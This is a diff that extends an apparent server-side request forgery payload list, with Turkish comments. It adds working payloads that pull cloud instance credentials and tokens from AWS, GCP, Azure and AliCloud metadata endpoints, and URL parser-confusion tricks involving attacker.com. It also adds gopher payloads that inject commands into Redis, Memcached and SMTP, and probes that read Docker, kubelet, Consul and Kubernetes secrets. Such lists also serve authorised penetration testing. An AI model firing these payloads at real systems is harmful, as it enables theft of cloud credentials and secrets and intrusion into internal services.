@@ -332,3 +332,33 @@ X-Forwarded-Host: 169.254.169.254
 X-Original-URL: /admin
 X-Rewrite-URL: /admin
 Host: 169.254.169.254
+
+# ── [v2026-06] MODERN / ADVANCED ADDITIONS ──
+# AWS IMDSv2 token akışı + IPv6 + IP obfuscation
+http://[fd00:ec2::254]/latest/meta-data/
+http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
+# GCP token + Azure IMDS token + Oracle OCI + AliCloud RAM
+http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+http://100.100.100.200/latest/meta-data/ram/security-credentials/
+# DNS rebinding / localhost confusion servisleri
+http://127.0.0.1.nip.io/
+http://localtest.me/
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io/
+http://spoofed.burpcollaborator.net/
+# parser confusion (@ / # / backslash)
+http://attacker.com\@127.0.0.1/
+http://127.0.0.1#@attacker.com/
+http://attacker.com#@127.0.0.1/
+http://127.0.0.1%2f%2e%2e/
+# kısa / sıfır host
+http://0/
+http://[::]:80/
+# iç servis probe (Redis/Memcached/Docker/k8s/Consul/ES)
+gopher://127.0.0.1:6379/_%0d%0aSET%20x%20payload%0d%0a
+gopher://127.0.0.1:11211/_%0d%0aset%20x%200%200%201%0d%0a1%0d%0a
+gopher://127.0.0.1:25/_HELO%20x%0d%0aMAIL%20FROM
+http://127.0.0.1:2375/version
+http://127.0.0.1:10250/pods
+http://127.0.0.1:8500/v1/kv/?recurse
+http://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/secrets
